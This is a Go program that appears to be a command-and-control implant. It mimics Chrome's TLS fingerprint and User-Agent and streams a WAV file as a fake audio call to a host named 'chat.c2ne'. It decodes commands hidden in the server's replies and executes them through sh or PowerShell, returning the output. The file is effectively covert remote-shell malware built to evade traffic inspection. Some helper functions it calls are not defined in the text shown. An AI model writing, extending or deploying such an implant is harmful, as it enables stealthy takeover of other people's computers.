package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"time"
	"sync"
	"runtime"
	"os/exec"
	"strings"
	"os"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

var	baseAudioTrack []byte

func dialH2()(*http2.ClientConn, error){

	tcpConn, err := net.Dial("tcp", "127.0.0.1:443")
	if err != nil {
		fmt.Println("tcp dial:", err)
		return nil, err
	}

	//uTLS with h2 ALPN
	config := &utls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		ServerName:         "localhost",
	}
	uConn := utls.UClient(tcpConn, config, utls.HelloChrome_Auto)

	if err := uConn.Handshake(); err != nil {
		fmt.Println("utls handshake:", err)
		return nil, err
	}

	//verify h2 negotiation from server
	if uConn.ConnectionState().NegotiatedProtocol != "h2" {
		fmt.Println("h2 not negotiated, got:",
			uConn.ConnectionState().NegotiatedProtocol)
		return nil, nil //need an err here
	}
	fmt.Println("client: h2 negotiated via uTLS")

	//http2 transport over uTLS conn
	transport := &http2.Transport{
		ChromeCompatConfig: http2.ChromeCompatConfig{Enabled: true},
	}
	//transport := &http2.Transport{}
	clientConn, err := transport.NewClientConn(uConn)
	if err != nil {
		fmt.Println("http2 NewClientConn:", err)
		return nil, err
	}

	return clientConn, nil
}

func startAudioCall(clientConn *http2.ClientConn){
	baseAudioTrack, _ = os.ReadFile("sample.wav")
	//if err != nil{
	//	fmt.Println("not in location file:", filename)
	//}
	index :=0
	ChunkSize := 640 //per 20 ms
	totalTrackBytes := len(baseAudioTrack)
	byteOffset :=0
	/*if index==0{
		byteOffset+= int(h.DataStart) //TODO if it is the first chunk, dont include header in the chunk
	}*/

	pr, pw := io.Pipe()

	req, err := http.NewRequest("POST", "https://chat.c2ne:443/call", pr)
	if err != nil {
		log.Fatal("new request:", err)
	}
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"+
		" AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	// RoundTrip sends request headers and returns once response headers arrive
	// pr keeps streaming request body data to server after this returns
	resp, err := clientConn.RoundTrip(req)
	if err != nil {
		log.Fatal("roundtrip:", err)
	}
	fmt.Println("client: connected, proto:", resp.Proto)

	var wg sync.WaitGroup

	// write a chunk of bytes every 20ms via pw
	wg.Go(func() {
		defer pw.Close() // closing pw sends EOF to server's r.Body
		ticker := time.NewTicker(5 * time.Millisecond)
		defer ticker.Stop()
		for {
			select{ //need case for when server closes conn
			case <-ticker.C:
				num:=0
				chunk := make([]byte, ChunkSize)
				byteOffset = index*ChunkSize //TODO logic to set header byteoffset, if index=0
				if byteOffset+ChunkSize > totalTrackBytes {
					num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
					index=0
				}else{
					num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
				}
				encodedChunk := encodingEngine(chunk, num)
				//fmt.Println("enc len ", len(encodedChunk))
				pw.Write(encodedChunk)
				index++
			}
		}
	})

	//read HELLO from server via resp.Body (blocks until server writes)
	wg.Go(func() {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		for {
			n, err := resp.Body.Read(buf)
			if n > 0 {
				cmd, isFullCmd := decoderEngine(buf[:n]) //might need to catch isFullCmd
				if isFullCmd=="true"{	//||isFullCmd=="none"{
					//fmt.Println("command ", cmd)
					executeCommand(cmd)
				}/*else{
					fmt.Println("full command recieved = ", isFullCmd)
				}*/
			}
			if err != nil {
				return
			}
		}
	})
	wg.Wait()
}

var targetDir string
func executeCommand(finalCommand string){
	if len(finalCommand)!=0{
		shellBinary := "sh"
		shellFlag := "-c"
		var formatted_out string
		
		if runtime.GOOS == "windows"{
			shellBinary = "powershell"
			shellFlag = "/C"
		}

		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
		args := strings.Fields(finalCommand)
		switch args[0]{
		case "cd":
			targetDir ="/"
			if len(args)>1{
				if targetDir == "../"||targetDir == "../../"{ //TODO -- write a better logic, like OS.chdir or somtn
					targetDir = targetDir+args[1]
				}
				targetDir=args[1]
			}
		}
		//validate targetDir
		cmd.Dir = targetDir //either this, or os.Chdir, but we would need os.Stat and os.isDir or something for that
		res, err := cmd.Output()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
        		formatted_out = fmt.Sprintf("%s", string(exitErr.Stderr))
    		}else{
    			formatted_out = "unknown error for " + finalCommand
    		}
		}else{
			formatted_out = strings.TrimSpace(string(res))
		}

		//fmt.Println("formatted_out = ", formatted_out)
		//fmt.Println("output length - ", len(formatted_out)) 
		cliMessageChan <- formatted_out
	}
}

func main() {
	
	clientConn, _ := dialH2()
	startAudioCall(clientConn)
}